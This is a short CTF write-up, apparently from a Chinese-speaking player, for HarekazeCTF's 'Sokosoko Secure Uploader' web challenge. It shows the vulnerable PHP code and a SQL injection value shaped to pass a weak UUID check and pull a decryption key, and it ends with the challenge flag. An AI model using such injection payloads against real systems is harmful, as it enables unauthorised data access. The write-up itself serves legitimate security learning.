# Sokosoko Secure Uploader
## Challenge details
|       Event        | Challenge | Category | Points  |
|:-------------------|:----------|:---------|:-------:|
| HarekazeCTF        |Sokosoko Secure Uploader    |Web   |100      |

### Description
> I encrypted my file by using this service. Attachment is the encrypted file, but I accidentally deleted the UUID of the file. All I remember is the UUID starts with 9e5a :(
### Attachments
> [flag.png.encrypted](flag.png.encrypted)  
> `src.zip`    
## Solution
在function.php中，对uuid的判断函数为
```php
function is_uuid($str) {
  if (strlen($str) !== 36) {
    return false;
  }
  if ($str[8] !== '-' or $str[13] !== '-' or $str[18] !== '-' or $str[23] !== '-') {
    return false;
  }
  return true;
}
```
之后访问数据库的命令为
```php
$pdo = new PDO('sqlite:key.db');
$stmt = $pdo->query("SELECT key FROM decryption_key WHERE id = '$uuid'");
$res = $stmt->fetch();
```
所以可以通过构造uuid来解密文件  
将uuid设置为'or id/*-1111-1111-1111-*/like '9e5%  
成功解密图片  
HareKazeCTF{k41k4n_j1kk4n_j1n615uk4n}  